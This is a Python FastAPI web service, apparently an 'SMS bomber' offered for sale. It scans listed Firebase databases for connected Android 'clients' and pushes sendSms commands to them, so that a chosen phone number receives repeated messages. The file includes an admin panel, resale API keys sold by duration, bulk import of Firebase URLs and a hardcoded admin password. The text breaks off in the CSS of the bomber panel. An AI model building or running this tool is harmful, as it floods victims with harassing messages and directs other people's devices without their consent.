import asyncio
import json
import os
import time
import random
import string
import secrets
import html as html_lib
import re
from datetime import datetime
from typing import List, Optional, Tuple

import aiohttp
from fastapi import FastAPI, Request, Form, File, UploadFile
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from starlette.middleware.sessions import SessionMiddleware
from fastapi.middleware.cors import CORSMiddleware

ADMIN_PASSWORD = "EVILPRIYANSHU799"
SECRET_KEY = os.environ.get("SESSION_SECRET", secrets.token_hex(32))
DATA_FILE = "api_data.json"
API_KEY_HEADER = "X-API-Key"
VERSION = "SMS-API v0.7"

# Bot-matching speeds (same as Telegram blast bot)
SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM
DEVELOPER = "@VORTEX_PRIYANSHU"
CHANNEL_URL = "https://t.me/+904FzUCPszJjZTU1"
CHANNEL_NAME = "Official Channel"

app = FastAPI(title="SMS Firebase API", version=VERSION)
# CORS first (outermost) — allow browser / file HTML panels
app.add_middleware(SessionMiddleware, secret_key=SECRET_KEY)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
    expose_headers=["*"],
)


def brand():
    return {
        "Developer": DEVELOPER,
        "Channel": CHANNEL_URL,
        "Channel_Name": CHANNEL_NAME,
    }


def normalize_fb_url(url: str) -> str:
    url = (url or "").strip().rstrip("/")
    if not url:
        return ""
    if not url.startswith("http"):
        url = "https://" + url
    return url.rstrip("/")


def normalize_keys(d: dict) -> dict:
    keys = d.get("api_keys", [])
    new = []
    changed = False
    for item in keys:
        if isinstance(item, str):
            new.append({
                "key": item,
                "label": item,
                "unit": "lifetime",
                "amount": 0,
                "duration": "lifetime",
                "expires_at": None,
                "created_at": int(time.time()),
            })
            changed = True
        elif isinstance(item, dict) and item.get("key"):
            if "unit" not in item:
                item = dict(item)
                item["unit"] = item.get("duration", "lifetime")
                item["amount"] = 1 if item.get("expires_at") else 0
                changed = True
            new.append(item)
        else:
            changed = True
    if changed:
        d["api_keys"] = new
    return d


def default_data():
    return {
        "firebases": [],
        "api_keys": [],
        "stats": {"total_sent": 0, "total_failed": 0},
        "activity": [],
        "settings": {"require_api_key": False},
    }


def load():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            for k, v in default_data().items():
                if k not in data:
                    data[k] = v
            return normalize_keys(data)
        except Exception:
            pass
    d = default_data()
    save(d)
    return d


def save(d):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)


def log_act(d, action, details=""):
    d.setdefault("activity", []).append({
        "ts": int(time.time()),
        "action": action,
        "details": details,
    })
    if len(d["activity"]) > 300:
        d["activity"] = d["activity"][-300:]


def fmt_time(ts):
    if not ts:
        return "-"
    return datetime.fromtimestamp(int(ts)).strftime("%d/%m/%Y %H:%M")


def calc_expires(unit: str, amount: int) -> Tuple[str, Optional[int]]:
    """unit: day|month|year|lifetime  amount: 1,2,3..."""
    unit = (unit or "lifetime").lower().strip()
    try:
        amount = int(amount)
    except Exception:
        amount = 1
    amount = max(1, min(amount, 3650))
    now = int(time.time())
    if unit in ("lifetime", "permanent", "life", "forever"):
        return "lifetime", None
    if unit in ("day", "days", "d"):
        return f"{amount}_day", now + amount * 86400
    if unit in ("month", "months", "m"):
        return f"{amount}_month", now + amount * 30 * 86400
    if unit in ("year", "years", "y"):
        return f"{amount}_year", now + amount * 365 * 86400
    return "lifetime", None


def key_info_payload(item: dict) -> dict:
    exp = item.get("expires_at")
    now = int(time.time())
    if exp is None:
        return {
            "key_label": item.get("label", ""),
            "key_duration": "lifetime",
            "key_status": "LIFETIME",
            "expires_at": None,
            "expires_on": "Never",
            "remaining_seconds": None,
            "remaining_days": None,
            "remaining_text": "Permanent / Lifetime",
        }
    exp = int(exp)
    left = exp - now
    if left <= 0:
        return {
            "key_label": item.get("label", ""),
            "key_duration": item.get("duration", ""),
            "key_status": "EXPIRED",
            "expires_at": exp,
            "expires_on": fmt_time(exp),
            "remaining_seconds": 0,
            "remaining_days": 0,
            "remaining_text": "Expired",
        }
    days = left // 86400
    hours = (left % 86400) // 3600
    months = days // 30
    if months >= 1:
        rem = f"{months} month(s) {days % 30} day(s) left"
    elif days >= 1:
        rem = f"{days} day(s) {hours} hour(s) left"
    else:
        rem = f"{hours} hour(s) left"
    return {
        "key_label": item.get("label", ""),
        "key_duration": item.get("duration", ""),
        "key_status": "ACTIVE",
        "expires_at": exp,
        "expires_on": fmt_time(exp),
        "remaining_seconds": left,
        "remaining_days": days,
        "remaining_text": rem,
    }


def resolve_api_key(request: Request) -> Tuple[bool, Optional[dict], Optional[str]]:
    """
    Returns (ok, key_item_or_None, error_message)
    When require_api_key is False and no key given -> ok True, item None
    """
    d = load()
    require = d.get("settings", {}).get("require_api_key", False)
    keys = d.get("api_keys", [])
    raw = request.headers.get(API_KEY_HEADER) or request.query_params.get("api_key")

    if not require and not raw:
        return True, None, None
    if require and not keys:
        return True, None, None
    if require and not raw:
        return False, None, "API key required"
    if not raw:
        return True, None, None

    now = int(time.time())
    for item in keys:
        if isinstance(item, str):
            if item == raw:
                return True, {
                    "key": item, "label": item, "duration": "lifetime",
                    "expires_at": None, "created_at": 0,
                }, None
        elif isinstance(item, dict) and item.get("key") == raw:
            exp = item.get("expires_at")
            if exp is not None and int(exp) <= now:
                return False, item, "API key expired"
            return True, item, None
    return False, None, "Invalid API key"


def api_json(data: dict, key_item: Optional[dict] = None, status: int = 200):
    out = {**data, **brand()}
    if key_item:
        out["key_info"] = key_info_payload(key_item)
    return JSONResponse(out, status_code=status)


CACHED_DEVICES: List[dict] = []
LAST_SCAN = 0


async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if not txt or txt == "null":
                        return {}
                    return json.loads(txt)
    except Exception:
        pass
    return {}


async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception:
            pass
        await asyncio.sleep(0.4 * (attempt + 1))
    return False


def device_online(dev: dict) -> bool:
    return bool(
        dev.get("isOnline")
        or dev.get("online")
        or dev.get("connected")
        or dev.get("status") in ("online", "active", True, 1)
    )


async def get_online_devices(d: dict) -> list:
    results = []
    sem = asyncio.Semaphore(15)

    async def fetch_fb(fb: dict):
        shallow = await fb_get(fb["url"], "/clients.json?shallow=true")
        if not isinstance(shallow, dict):
            return
        for dev_id in list(shallow.keys())[:100]:
            async with sem:
                data = await fb_get(fb["url"], f"/clients/{dev_id}.json")
            if isinstance(data, dict) and device_online(data):
                results.append({
                    "fb_id": fb["id"],
                    "fb_url": fb["url"],
                    "fb_label": fb.get("label", ""),
                    "dev_id": dev_id,
                    "name": data.get("deviceName") or data.get("name") or dev_id[:14],
                    "sim": int(data.get("simSlot", 0) or 0),
                })

    await asyncio.gather(*(fetch_fb(fb) for fb in d.get("firebases", [])))
    return results


async def send_sms(fb_url: str, dev_id: str, sim: int, to: str, message: str) -> bool:
    """Same payload/path as Telegram bot — no wait_ack (bot medium style)."""
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim,
            "to": str(to).strip(),
            "message": str(message).strip(),
            "isSended": False,
            "timestamp": int(time.time()),
        },
    )


async def scanner_loop():
    global CACHED_DEVICES, LAST_SCAN
    while True:
        try:
            d = load()
            if d.get("firebases"):
                CACHED_DEVICES = await get_online_devices(d)
                LAST_SCAN = time.time()
        except Exception:
            pass
        await asyncio.sleep(60)


@app.on_event("startup")
async def on_start():
    async def _boot_scan():
        global CACHED_DEVICES, LAST_SCAN
        try:
            d = load()
            if d.get("firebases"):
                CACHED_DEVICES = await get_online_devices(d)
                LAST_SCAN = time.time()
        except Exception:
            pass
        await scanner_loop()
    asyncio.create_task(_boot_scan())


def parse_firebase_lines(text: str) -> list:
    """Extract firebase URLs from free text / txt file. Supports Label | URL."""
    found = []
    seen = set()
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        label = ""
        url = line
        if "|" in line:
            parts = [p.strip() for p in line.split("|", 1)]
            if len(parts) == 2:
                label, url = parts[0], parts[1]
        # also catch plain URLs in line
        m = re.search(r"https?://[^\s,'\"<>]+", url)
        if m:
            url = m.group(0)
        url = normalize_fb_url(url)
        if "firebase" not in url.lower() and "firebasedatabase" not in url.lower():
            # still allow if looks like rtdb
            if "firebaseio.com" not in url and "firebasedatabase.app" not in url:
                continue
        key = url.lower()
        if key in seen:
            continue
        seen.add(key)
        found.append({"url": url, "label": label or url[:40]})
    return found


def add_firebases(d: dict, items: list) -> Tuple[int, int]:
    """Add list of {url,label}. Returns (added, skipped_duplicates)."""
    existing = {normalize_fb_url(f.get("url", "")).lower() for f in d.get("firebases", [])}
    added = skipped = 0
    for it in items:
        url = normalize_fb_url(it.get("url", ""))
        if not url:
            continue
        if url.lower() in existing:
            skipped += 1
            continue
        fb_id = "fb_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        d.setdefault("firebases", []).append({
            "id": fb_id,
            "url": url,
            "label": (it.get("label") or url[:40]).strip(),
            "added_at": int(time.time()),
        })
        existing.add(url.lower())
        added += 1
    return added, skipped



def home_html(devices: int = 0, fb_count: int = 0, total_sent: int = 0, key_count: int = 0, status_note: str = "") -> str:
    note = status_note or ("Live" if devices else ("Add Firebase in Admin" if fb_count == 0 else "Scanning…"))
    return f"""<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>LUFFY SMS API</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet"/>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{
  min-height:100vh;color:#eef3ff;font-family:Rajdhani,system-ui,sans-serif;
  background:#0c0e14;
  background-image:
    radial-gradient(ellipse 90% 55% at 50% -15%,rgba(59,130,246,.16),transparent 55%),
    radial-gradient(ellipse 40% 30% at 100% 100%,rgba(129,140,248,.08),transparent 45%);
}}
a{{color:#67e8f9;text-decoration:none}}
a:hover{{opacity:.9}}
.wrap{{max-width:880px;margin:0 auto;padding:28px 16px 48px}}
nav{{display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:28px}}
.brand{{font-family:Orbitron,sans-serif;font-weight:800;font-size:15px;letter-spacing:.06em;
  background:linear-gradient(90deg,#38bdf8,#818cf8,#e879f9);-webkit-background-clip:text;background-clip:text;color:transparent}}
.nav a{{
  display:inline-flex;align-items:center;padding:10px 16px;border-radius:999px;font-size:12px;font-weight:700;
  letter-spacing:.06em;text-transform:uppercase;border:1px solid rgba(255,255,255,.08);color:#e2e8f0;background:rgba(255,255,255,.03)
}}
.nav a.pri{{background:linear-gradient(45deg,#1a4fcc,#3b82f6);border:0;box-shadow:0 8px 24px rgba(26,79,204,.35)}}
.hero{{text-align:center;padding:18px 0 28px}}
.badge{{
  display:inline-block;padding:6px 12px;border-radius:999px;font-size:10px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;
  color:#93c5fd;background:rgba(59,130,246,.12);border:1px solid rgba(59,130,246,.28);margin-bottom:14px
}}
h1{{font-family:Orbitron,sans-serif;font-size:clamp(22px,5vw,34px);line-height:1.25;letter-spacing:.04em;margin-bottom:10px}}
h1 span{{background:linear-gradient(90deg,#38bdf8,#a78bfa);-webkit-background-clip:text;background-clip:text;color:transparent}}
.sub{{color:#8b93a7;max-width:520px;margin:0 auto 20px;font-size:15px;line-height:1.55}}
.cta{{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}}
.cta a{{
  display:inline-flex;align-items:center;justify-content:center;padding:12px 18px;border-radius:999px;
  font-weight:700;font-size:13px;letter-spacing:.04em
}}
.cta .p{{background:linear-gradient(45deg,#1a4fcc,#3b82f6);color:#fff;box-shadow:0 10px 28px rgba(26,79,204,.3)}}
.cta .g{{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);color:#e2e8f0}}
.stats{{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin:8px 0 22px}}
@media(min-width:640px){{.stats{{grid-template-columns:repeat(4,1fr)}}}}
.stat{{
  background:rgba(18,20,28,.85);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:14px;text-align:center
}}
.stat b{{display:block;font-family:Orbitron,sans-serif;font-size:20px;color:#22d3ee;margin-bottom:4px}}
.stat span{{font-size:10px;color:#7c879c;text-transform:uppercase;letter-spacing:.08em}}
.note{{text-align:center;color:#6b7280;font-size:12px;margin-bottom:18px}}
.grid{{display:grid;gap:12px;grid-template-columns:1fr}}
@media(min-width:720px){{.grid{{grid-template-columns:1fr 1fr}}}}
.card{{
  background:rgba(18,20,28,.88);border:1px solid rgba(255,255,255,.06);border-radius:18px;padding:18px;
  box-shadow:0 16px 40px rgba(0,0,0,.25)
}}
.card h2{{font-family:Orbitron,sans-serif;font-size:12px;letter-spacing:.08em;margin-bottom:10px;color:#e2e8f0}}
.card p,.card li{{color:#8b93a7;font-size:14px;line-height:1.55}}
.card ul{{margin:8px 0 0 16px}}
.card li{{margin-bottom:4px}}
pre{{
  background:#080a10;border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:12px;
  color:#94a3b8;font-size:11px;overflow:auto;white-space:pre-wrap;word-break:break-all;margin-top:10px;
  font-family:ui-monospace,monospace
}}
.footer{{text-align:center;margin-top:28px;padding-top:16px;border-top:1px solid rgba(255,255,255,.06);color:#5b657a;font-size:12px}}
.footer a{{color:#818cf8}}
</style></head><body>
<div class="wrap">
<nav>
  <div class="brand">LUFFY SMS API</div>
  <div class="nav">
    <a href="/panel">Open Panel</a>
    <a class="pri" href="https://t.me/LUFFY_49" target="_blank">Get Key</a>
  </div>
</nav>

<section class="hero">
  <div class="badge">{html_lib.escape(VERSION)} · LIVE</div>
  <h1>Premium Firebase<br/><span>SMS Gateway</span></h1>
  <p class="sub">Secure REST API with key access, instant queue, and live device pool. Clean · Fast · Reseller ready.</p>
  <div class="cta">
    <a class="p" href="https://t.me/LUFFY_49" target="_blank">DM {html_lib.escape(DEVELOPER)}</a>
    <a class="g" href="https://www.instagram.com/shubham_26x" target="_blank">Instagram</a>
    <a class="g" href="/panel">User Panel</a>
  </div>
</section>

<div class="stats">
  <div class="stat"><b>{devices}</b><span>Devices</span></div>
  <div class="stat"><b>{fb_count}</b><span>Firebase</span></div>
  <div class="stat"><b>{total_sent}</b><span>Sent</span></div>
  <div class="stat"><b>{key_count}</b><span>Keys</span></div>
</div>
<p class="note">{html_lib.escape(note)}</p>

<div class="grid">
  <div class="card">
    <h2>ABOUT</h2>
    <p>Connected Android devices receive SMS commands via Firebase. Your request is queued instantly; delivery runs in the background at medium bot speed.</p>
    <ul>
      <li>Instant JSON response</li>
      <li>API keys: day / month / year / lifetime</li>
      <li>Live devices &amp; stats</li>
    </ul>
  </div>
  <div class="card">
    <h2>GET ACCESS</h2>
    <p>Keys are created by admin with custom name and duration. Contact developer for purchase or reseller plans.</p>
    <p style="margin-top:10px"><a href="https://t.me/LUFFY_49" target="_blank">Telegram · {html_lib.escape(DEVELOPER)}</a></p>
    <p><a href="https://www.instagram.com/shubham_26x" target="_blank">Instagram · @shubham_26x</a></p>
  </div>
  <div class="card">
    <h2>SEND EXAMPLE</h2>
    <pre>/api/send?api_key=YOUR_KEY&amp;number=9876543210&amp;message=hello&amp;count=10</pre>
  </div>
  <div class="card">
    <h2>ENDPOINTS</h2>
    <pre>GET /api/send
GET /api/devices
GET /api/stats
GET /api/keyinfo
GET /api/info
GET /panel</pre>
  </div>
</div>

<footer class="footer">
  Developed by <a href="https://t.me/LUFFY_49" target="_blank">{html_lib.escape(DEVELOPER)}</a>
  · <a href="https://www.instagram.com/shubham_26x" target="_blank">@shubham_26x</a>
  · {html_lib.escape(VERSION)}
</footer>
</div>
</body></html>"""


def login_html(error: str = None) -> str:
    err = f'<div class="alert err">{html_lib.escape(error)}</div>' if error else ""
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Admin | LUFFY</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet"/>
<style>
body{{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px;font-family:Rajdhani,system-ui,sans-serif;color:#eef3ff;
background:#0c0e14;background-image:radial-gradient(ellipse 80% 50% at 50% -10%,rgba(59,130,246,.15),transparent 55%)}}
.card{{width:100%;max-width:400px;background:rgba(18,20,28,.9);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:32px 26px;box-shadow:0 25px 60px rgba(0,0,0,.5);position:relative;overflow:hidden}}
.card:before{{content:'';position:absolute;top:0;left:-100%;width:100%;height:2px;background:linear-gradient(90deg,transparent,#3b82f6,transparent);animation:run 3s linear infinite}}
@keyframes run{{to{{left:100%}}}}
h1{{margin:0;font-family:Orbitron,sans-serif;font-size:20px;letter-spacing:.08em;text-align:center;
background:linear-gradient(90deg,#38bdf8,#818cf8);-webkit-background-clip:text;background-clip:text;color:transparent}}
.sub{{text-align:center;color:#7c879c;font-size:11px;letter-spacing:.2em;text-transform:uppercase;margin:8px 0 22px}}
label{{display:block;font-size:11px;color:#7c879c;margin-bottom:6px;letter-spacing:.08em;text-transform:uppercase}}
input{{width:100%;box-sizing:border-box;background:rgba(0,0,0,.45);border:1px solid rgba(255,255,255,.08);color:#fff;border-radius:14px;padding:14px 16px;margin-bottom:14px;font-size:14px;outline:none}}
input:focus{{border-color:rgba(59,130,246,.5);box-shadow:0 0 0 3px rgba(59,130,246,.12)}}
button{{width:100%;border:0;border-radius:999px;padding:14px;font-weight:700;cursor:pointer;font-family:Orbitron,sans-serif;font-size:12px;letter-spacing:.12em;text-transform:uppercase;
background:linear-gradient(45deg,#1a4fcc,#3b82f6);color:#fff;box-shadow:0 10px 28px rgba(26,79,204,.35)}}
.alert{{border-radius:12px;padding:11px;margin-bottom:12px;text-align:center;font-size:13px}}
.alert.err{{background:rgba(244,63,94,.12);border:1px solid rgba(244,63,94,.3);color:#fda4af}}
.foot{{text-align:center;margin-top:18px;font-size:12px;color:#5b657a}}
.foot a{{color:#818cf8;text-decoration:none}}
</style></head><body>
<div class="card">
<h1>LUFFY ADMIN</h1>
<p class="sub">Premium Control Panel</p>
{err}
<form method="post" action="/admin/login">
<label>Admin Password</label>
<input type="password" name="password" placeholder="Enter password" required autofocus/>
<button type="submit">Authenticate →</button>
</form>
<div class="foot">Dev <a href="https://t.me/LUFFY_49" target="_blank">{html_lib.escape(DEVELOPER)}</a>
 · <a href="https://www.instagram.com/shubham_26x" target="_blank">@shubham_26x</a></div>
</div></body></html>"""


def admin_html(d: dict, devices: list, last_scan: str, qp: dict) -> str:
    alerts = ""
    if qp.get("newkey"):
        alerts += f'<div class="ok">Key created: <code>{html_lib.escape(qp["newkey"])}</code></div>'
    if qp.get("sent"):
        alerts += f'<div class="ok">Test send — Sent: {html_lib.escape(qp.get("sent",""))} | Failed: {html_lib.escape(qp.get("fail",""))}</div>'
    if qp.get("err") == "nodevice":
        alerts += '<div class="err">Koi online device nahi mila.</div>'
    if qp.get("bulk"):
        alerts += f'<div class="ok">Bulk Firebase: Added {html_lib.escape(qp.get("bulk_added","0"))} | Skipped duplicates {html_lib.escape(qp.get("bulk_skip","0"))}</div>'
    if qp.get("dup"):
        alerts += '<div class="err">Duplicate Firebase — already exists, skip.</div>'

    fb_rows = ""
    for fb in d.get("firebases", []):
        fb_rows += f"""<tr>
<td>{html_lib.escape(str(fb.get("label","")))}</td>
<td><code>{html_lib.escape(str(fb.get("url","")))}</code></td>
<td><form method="post" action="/admin/firebase/delete" style="display:inline">
<input type="hidden" name="fb_id" value="{html_lib.escape(str(fb.get("id","")))}"/>
<button class="danger small" type="submit">Delete</button></form></td></tr>"""
    if not fb_rows:
        fb_rows = '<tr><td colspan="3" class="muted">Koi Firebase add nahi hua.</td></tr>'

    dev_rows = ""
    for dv in devices[:60]:
        dev_rows += f"""<tr>
<td>{html_lib.escape(str(dv.get("name","")))}</td>
<td><code>{html_lib.escape(str(dv.get("dev_id",""))[:20])}</code></td>
<td class="muted">{html_lib.escape(str(dv.get("fb_label") or dv.get("fb_id","")))}</td></tr>"""
    if not dev_rows:
        dev_rows = '<tr><td colspan="3" class="muted">Koi online device nahi.</td></tr>'

    key_rows = ""
    for item in d.get("api_keys", []):
        if isinstance(item, str):
            item = {"key": item, "label": item, "duration": "lifetime", "expires_at": None}
        info = key_info_payload(item)
        key_rows += f"""<li style="border:1px solid #1b2030;border-radius:8px;padding:10px;margin-bottom:8px">
<div style="display:flex;justify-content:space-between;gap:8px;align-items:flex-start">
<div>
  <b>{html_lib.escape(str(item.get("label","")))}</b>
  <div><code style="font-size:11px;color:#67e8f9;word-break:break-all">{html_lib.escape(str(item.get("key","")))}</code></div>
  <div class="muted" style="margin-top:4px">{html_lib.escape(info["key_status"])} · {html_lib.escape(info["remaining_text"])} · Exp: {html_lib.escape(info["expires_on"])}</div>
</div>
<form method="post" action="/admin/apikey/delete">
<input type="hidden" name="key" value="{html_lib.escape(str(item.get("key","")))}"/>
<button class="danger small" type="submit">Del</button></form>
</div></li>"""
    if not key_rows:
        key_rows = '<p class="muted">No keys yet.</p>'

    act_rows = ""
    for a in reversed(d.get("activity", [])[-20:]):
        act_rows += f"""<tr>
<td class="muted">{fmt_time(a.get("ts"))}</td>
<td>{html_lib.escape(str(a.get("action","")))}</td>
<td class="muted">{html_lib.escape(str(a.get("details","")))}</td></tr>"""
    if not act_rows:
        act_rows = '<tr><td colspan="3" class="muted">No activity.</td></tr>'

    req_key = "ON" if d.get("settings", {}).get("require_api_key") else "OFF"
    stats = d.get("stats", {})

    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>LUFFY Admin</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet"/>
<style>
body{{margin:0;background:#0c0e14;color:#eef3ff;font-family:Rajdhani,system-ui,sans-serif;background-image:radial-gradient(ellipse 80% 40% at 50% -10%,rgba(59,130,246,.12),transparent 55%)}}
a{{color:#67e8f9;text-decoration:none}}
.wrap{{max-width:1000px;margin:0 auto;padding:20px 16px 40px}}
nav{{display:flex;justify-content:space-between;align-items:center;padding:12px 0 20px;border-bottom:1px solid #1b2030;margin-bottom:20px}}
.card{{background:#0e111a;border:1px solid #1b2030;border-radius:14px;padding:16px;margin-bottom:14px}}
.grid{{display:grid;gap:12px;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));margin-bottom:14px}}
.stat{{background:#0e111a;border:1px solid #1b2030;border-left:4px solid #a855f7;border-radius:12px;padding:14px}}
.stat b{{display:block;font-size:22px;color:#22d3ee}}
.stat span{{font-size:12px;color:#8b9bb0}}
h1{{margin:0 0 4px;font-size:24px}}h2{{margin:0 0 12px;font-size:16px}}
.muted{{color:#8b9bb0;font-size:13px}}
input,textarea,select{{width:100%;box-sizing:border-box;background:#0a0d14;border:1px solid #1b2030;color:#fff;border-radius:10px;padding:10px;margin:0 0 10px;font-size:14px}}
button{{border:0;border-radius:10px;padding:10px 14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,#d946ef,#a855f7);color:#fff;font-size:13px}}
button.secondary{{background:#151a24;border:1px solid #1b2030;color:#e5e7eb}}
button.danger{{background:#e11d48;color:#fff}}
button.small{{padding:6px 10px;font-size:12px}}
.row{{display:flex;gap:8px;flex-wrap:wrap}}
table{{width:100%;border-collapse:collapse;font-size:13px}}
th,td{{text-align:left;padding:8px 6px;border-bottom:1px solid #1b2030;vertical-align:top}}
th{{color:#8b9bb0;font-size:11px;text-transform:uppercase}}
code{{font-family:ui-monospace,monospace;font-size:12px}}
.ok{{background:rgba(16,185,129,.12);border:1px solid rgba(16,185,129,.35);color:#6ee7b7;padding:10px 12px;border-radius:10px;margin-bottom:12px;font-size:13px}}
.err{{background:rgba(244,63,94,.12);border:1px solid rgba(244,63,94,.35);color:#fda4af;padding:10px 12px;border-radius:10px;margin-bottom:12px;font-size:13px}}
.split{{display:grid;gap:14px;grid-template-columns:repeat(auto-fit,minmax(280px,1fr))}}
</style></head><body>
<div class="wrap">
<nav>
  <div><b>SMS API</b> <span class="muted">{VERSION}</span> · Dev {html_lib.escape(DEVELOPER)}</div>
  <a href="/admin/logout">Logout</a>
</nav>
<h1>Admin Panel</h1>
<p class="muted">Last scan: {html_lib.escape(last_scan)} · Channel: <a href="{html_lib.escape(CHANNEL_URL)}" target="_blank">Telegram</a></p>
{alerts}
<div class="grid">
  <div class="stat"><b>{len(devices)}</b><span>Online Devices</span></div>
  <div class="stat"><b>{len(d.get("firebases",[]))}</b><span>Firebases</span></div>
  <div class="stat"><b>{stats.get("total_sent",0)}</b><span>Total Sent</span></div>
  <div class="stat"><b>{stats.get("total_failed",0)}</b><span>Failed</span></div>
</div>

<div class="split">
  <div class="card">
    <h2>Add Firebase (single)</h2>
    <form method="post" action="/admin/firebase/add">
      <input name="url" placeholder="https://xxx-default-rtdb.firebaseio.com" required/>
      <input name="label" placeholder="Label (optional)"/>
      <div class="row">
        <button type="submit">Add</button>
        <button type="submit" formaction="/admin/scan" formmethod="post" class="secondary">Rescan</button>
      </div>
    </form>
  </div>

  <div class="card">
    <h2>Bulk Firebase (TXT / paste)</h2>
    <form method="post" action="/admin/firebase/bulk" enctype="multipart/form-data">
      <input type="file" name="file" accept=".txt,text/plain"/>
      <textarea name="text" rows="5" placeholder="One URL per line&#10;Label | https://xxx.firebaseio.com&#10;https://yyy.firebaseio.com"></textarea>
      <button type="submit">Bulk Add (skip duplicates)</button>
    </form>
  </div>

  <div class="card">
    <h2>Test Send</h2>
    <form method="post" action="/admin/test-send">
      <input name="number" placeholder="9876543210" required/>
      <input name="message" placeholder="Test message" required/>
      <input type="number" name="count" value="1" min="1" max="50"/>
      <button type="submit">Send Test</button>
    </form>
  </div>

  <div class="card">
    <h2>Custom API Key (status: {req_key})</h2>
    <form method="post" action="/admin/apikey/create" style="margin-bottom:12px">
      <input name="label" placeholder="Label (e.g. Reseller1)" required/>
      <input name="custom_key" placeholder="Custom Key (e.g. LUFFY_PRO_1)" required/>
      <div class="row">
        <input type="number" name="amount" value="1" min="1" max="3650" placeholder="Amount" style="flex:1"/>
        <select name="unit" style="flex:1">
          <option value="day">Day(s)</option>
          <option value="month">Month(s)</option>
          <option value="year">Year(s)</option>
          <option value="lifetime" selected>Lifetime</option>
        </select>
      </div>
      <p class="muted" style="margin:0 0 10px">Example: Amount 7 + Day = 7 days · Amount 3 + Month = 3 months · Lifetime = never expire</p>
      <button type="submit">Create Key</button>
    </form>
    <form method="post" action="/admin/settings/apikey" class="row" style="margin-bottom:12px">
      <button name="enabled" value="1" type="submit">Require Key ON</button>
      <button name="enabled" value="0" type="submit" class="secondary">Require Key OFF</button>
    </form>
    {key_rows}
  </div>

  <div class="card">
    <h2>API Usage</h2>
    <p class="muted" style="margin-bottom:8px">Header: X-API-Key: your_key<br/>or ?api_key=your_key</p>
    <code style="display:block;background:#05070c;padding:10px;border-radius:8px;border:1px solid #1b2030;color:#94a3b8;font-size:11px;white-space:pre-wrap">/api/send?number=98...&message=hi&count=10&api_key=YOUR_KEY</code>
  </div>
</div>

<div class="card">
  <h2>Firebase Databases ({len(d.get("firebases",[]))})</h2>
  <table><thead><tr><th>Label</th><th>URL</th><th></th></tr></thead>
  <tbody>{fb_rows}</tbody></table>
</div>
<div class="card">
  <h2>Online Devices ({len(devices)})</h2>
  <table><thead><tr><th>Name</th><th>Device ID</th><th>FB</th></tr></thead>
  <tbody>{dev_rows}</tbody></table>
</div>
<div class="card">
  <h2>Activity</h2>
  <table><thead><tr><th>Time</th><th>Action</th><th>Details</th></tr></thead>
  <tbody>{act_rows}</tbody></table>
</div>
</div></body></html>"""



def panel_html() -> str:
    """Embedded bomber panel (same origin as API)."""
    return r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
<title>LUFFY COUSTOM SMS BOMBER</title>
<meta name="theme-color" content="#070b14"/>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&family=JetBrains+Mono:ital,wght@0,300;1,300&family=Share+Tech+Mono&display=swap');

*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{
  font-family:'Rajdhani',sans-serif;
  background:#0c0e14;
  min-height:100%;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px 14px;
  overflow:hidden;
  background-image:
    radial-gradient(ellipse 80% 50% at 50% -20%, rgba(56,189,248,.08), transparent 55%),
    radial-gradient(ellipse 50% 40% at 80% 100%, rgba(99,102,241,.06), transparent 50%);
}

#starCanvas {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: -2;
  background: radial-gradient(circle at center, #1a1d27 0%, #0c0e14 100%);
}
